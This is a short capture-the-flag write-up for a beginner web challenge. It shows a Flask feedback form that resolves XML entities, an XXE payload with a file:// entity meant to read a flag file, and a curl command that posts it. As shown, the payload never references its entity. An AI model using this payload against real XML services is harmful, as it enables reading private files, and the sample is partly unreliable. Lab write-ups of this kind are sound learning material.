# Zoo Feedback form!

Another beginner web exploitation problem. Here we are given the web link and python script of the web

```python
from flask import Flask, request, render_template_string, render_template
from lxml import etree

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        xml_data = request.data
        try:
            parser = etree.XMLParser(resolve_entities=True)
            root = etree.fromstring(xml_data, parser=parser)
        except etree.XMLSyntaxError as e:
            return render_template_string('<div style="color:red;">Error parsing XML: {{ error }}</div>', error=str(e))
        feedback_element = root.find('feedback')
        if feedback_element is not None:
            feedback = feedback_element.text
            return render_template_string('<div style="color:green;">Feedback sent to the Emus: {{ feedback }}</div>', feedback=feedback)
        else:
            return render_template_string('<div style="color:red;">Invalid XML format: feedback element not found</div>')

    return render_template('index.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```
we can send feedbacks that will never be read to the website and will try to exploit and get the flag file inside the same directory as the python script.

The first thing that grabbed my attention was it's heavy reliance on XML (ofc since its a feedback form).

After some research i found this XXE (XML External Entity) injection where you send malicious XML commands into the web.

```xml
<!DOCTYPE message [
  <!ENTITY xxe SYSTEM "file:///path/to/flag.txt">
]>
<message>
  <feedback>I am penetrating into your feedback web</feedback>
</message>
```
this is the payload i used. However, when i tried to send the feedback into the website box i kept getting this error.
```Error parsing XML: StartTag: invalid element name, line 3, column 28 (<string>, line 3)```

Somehow there was these invisible spaces BEFORE my feedback...

i fixed the problem by sending packages via ```curl``` in terminal.

```sh curl -X POST -H "Content-Type: application/xml" --data-binary @payload.xml https://web-zoo-feedback-form-2af9cc09a15e.2024.ductf.dev/```

(it took me a while)

and there the terminal will output the flag!
